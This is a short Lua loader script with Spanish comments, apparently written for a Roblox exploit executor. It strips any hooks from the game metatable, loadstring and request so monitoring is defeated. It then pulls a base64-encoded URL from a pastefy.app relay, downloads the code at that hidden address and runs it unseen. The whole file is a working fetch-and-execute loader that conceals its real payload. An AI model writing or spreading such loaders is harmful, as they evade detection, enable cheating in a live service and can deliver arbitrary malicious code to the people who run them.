pcall(function()
    local mt = getrawmetatable(game)
    if isfunctionhooked(mt.__namecall) then restorefunction(mt.__namecall) end
    if isfunctionhooked(mt.__index) then restorefunction(mt.__index) end
    if isfunctionhooked(mt.__newindex) then restorefunction(mt.__newindex) end
end)
pcall(function()
    if isfunctionhooked(loadstring) then restorefunction(loadstring) end
end)
pcall(function()
    if isfunctionhooked(request) then restorefunction(request) end
end)

-- 2. Cachear funciones limpias
local safeLoad = clonefunction(loadstring)
local safeGet = clonefunction(game.HttpGet)

-- 3. Obtener URL real desde relay
local ok, encoded = pcall(function()
    return safeGet(game, "https://pastefy.app/3q0ZacDP/raw", true)
end)

if not ok or not encoded then
    warn("[Loader] No se pudo obtener relay")
    return
end

local realUrl = crypt.base64decode(encoded:gsub("%s+", ""))

-- 4. Ejecutar script real
local ok2, src = pcall(function()
    return safeGet(game, realUrl, true)
end)

if not ok2 or not src then
    warn("[Loader] No se pudo obtener script")
    return
end

safeLoad(src)()
